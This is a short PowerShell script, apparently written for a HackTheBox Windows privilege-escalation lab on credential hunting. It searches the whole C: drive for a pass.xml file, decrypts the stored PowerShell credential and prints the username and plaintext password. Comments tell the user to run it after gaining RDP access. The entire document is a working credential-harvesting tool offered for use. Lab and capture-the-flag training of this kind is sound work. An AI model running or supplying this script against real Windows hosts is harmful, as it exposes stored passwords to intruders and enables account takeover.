# HacktheBox Windows Privesc Credential Hunting Module.
# Decrypting Powershell Credentials.
# Run this script to get the creds fast once you RDP into box. 
# Dont forget to Set-ExecutionPolicy first.

# Set the starting location
Clear-Host
Set-Location C:\

# Retrieve the first matching pass.xml file path
$filepath = Get-ChildItem -Recurse -Filter pass.xml -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName -First 1

# Check if a file path was found
if ($filepath) {
    # Import credentials from the XML file
    $credential = Import-Clixml -Path $filepath

    # Retrieve and display the username and password
    $credential.GetNetworkCredential().username
    $credential.GetNetworkCredential().password
} else {
    Write-Output "No pass.xml file found."
}
